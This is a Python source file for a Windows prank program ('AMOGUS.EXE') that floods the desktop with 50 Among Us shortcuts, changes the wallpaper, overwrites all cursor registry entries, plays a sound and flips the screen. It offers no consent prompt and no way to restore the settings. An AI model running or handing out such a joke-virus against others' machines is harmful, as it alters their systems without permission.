import os
import sys
import ctypes
import rotatescreen
from playsound import playsound
from pyshortcuts import make_shortcut
from subprocess import DEVNULL, STDOUT, check_call
from time import sleep
from threading import Thread

if __name__ == '__main__':
    def resource_path(relative_path):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        try:
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        return os.path.join(base_path, relative_path)

    def is_64bit_windows():
        try:
            return os.name == 'nt' and os.environ['PROCESSOR_ARCHITECTURE'].endswith('64')
        except AttributeError:
            if 'PROCESSOR_ARCHITEW6432' in os.environ:
                return False
            else:
                return True

    def change_bg(path):
        if is_64bit_windows():
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        else:
            ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)
    
    def change_cur(cur):
        commands = [
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v Arrow /t REG_EXPAND_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v Crosshair /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v Hand /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v Help /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v IBeam /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v No /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v NWPen /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v SizeAll /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v SizeNESW /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v SizeNS /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v SizeNWSE /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v SizeWE /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v UpArrow /t REG_SZ /d "{cur}" /f',
            f'REG ADD "HKEY_CURRENT_USER\\Control Panel\\Cursors" /v Wait /t REG_SZ /d "{cur}" /f'
        ]

        for i in range(0, len(commands)):
            check_call(commands[i], stdout=DEVNULL, stderr=STDOUT)
    
    def fun_with_screen():
        screen = rotatescreen.get_primary_display()

        for i in range(0, 7):
            if i % 2 != 0:
                pos = 180
            else:
                pos = 0
            screen.rotate_to(pos)
            sleep(1)

    os.system('cls & color 4 & title AMOGUS.EXE')
    print('Amogus.exe executed......')

    for i in range(1, 51):
        make_shortcut('https://store.steampowered.com/app/945360/Among_Us/', name='Amogus_' + str(i), icon=resource_path('amogus.ico'), desktop=True)
    print('Shortcuts created!!111')

    change_bg(os.path.abspath(resource_path('wallpaper.jpg')))
    print('Wallpaper changed!1!11')

    change_cur(os.path.abspath(resource_path('cursor.cur')))
    ctypes.windll.user32.SystemParametersInfoA(0x57)
    print('Cursor changed!!1!1111')

    sound_path = os.path.abspath(resource_path('AMOGUS.mp3')).replace('"', "'")
    Thread(target = playsound, args=(sound_path,)).start()
    Thread(target = fun_with_screen).start()
    print('Music playing!111!')
    print('Screen rotating!!11!!')
    sleep(8)
    os.system('color 7')
